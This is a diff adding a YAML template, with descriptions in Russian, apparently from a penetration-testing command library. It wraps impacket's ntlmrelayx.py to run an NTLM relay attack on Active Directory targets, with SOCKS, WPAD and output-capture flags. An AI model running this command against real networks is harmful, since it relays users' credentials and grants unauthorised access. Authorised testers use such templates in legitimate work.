@@ -1,0 +1,27 @@
+description: |-
+  Запускает ntlmrelayx.py
+
+  Запускать в подготовленной директории!
+  Будет сохранять файлы
+author: Internet
+install: pipx install impacket
+
+tags:
+  - active
+  - directory
+  - attack
+  - ntlm
+  - smb
+
+arguments:
+  targets:
+    description: путь до файла с целями, уязвимыми к релей атакам
+
+mode:
+  format:
+    targets: '{!r}'
+
+shell: bash
+script: >-
+  ip addr show;
+  sudo ntlmrelayx.py -w -ra -tf #targets# -smb2support -of ./ntrlx_out -socks
